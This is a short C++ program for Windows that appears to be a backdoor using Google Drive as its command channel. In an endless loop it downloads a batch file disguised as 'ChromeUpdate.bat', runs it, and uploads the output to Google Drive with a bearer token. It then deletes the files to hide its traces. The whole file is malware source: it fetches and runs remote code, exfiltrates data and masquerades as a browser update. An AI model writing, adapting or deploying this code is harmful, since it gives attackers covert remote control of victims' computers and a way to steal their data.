#include <windows.h>
#include <stdio.h>
#include <string>

int main() {

    while (true) {

        WinExec("cmd /c curl -L \"https://drive.google.com/uc?export=download&id={FILE-ID}\" -o %temp%\\ChromeUpdate.bat",1);
        Sleep(10000);
        WinExec("cmd /c %temp%\\ChromeUpdate.bat > %temp%\\ChromeUpdate.bin",1);
        Sleep(20000);
        WinExec("cmd /c curl -X POST -L -H \"Authorization: Bearer {OAUTH2-TOKEN}\" -F \"metadata={name : 'output.txt'};type=application/json;charset=UTF-8\" -F \"file=@%temp%\\ChromeUpdate.bin\" \"https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart\"",1);
        WinExec("cmd /c pause", 1);
        Sleep(1000);
        WinExec("cmd /c del %temp%\\ChromeUpdate.bin",1);
        WinExec("cmd /c del %temp%\\ChromeUpdate.bat",1);

    }
}
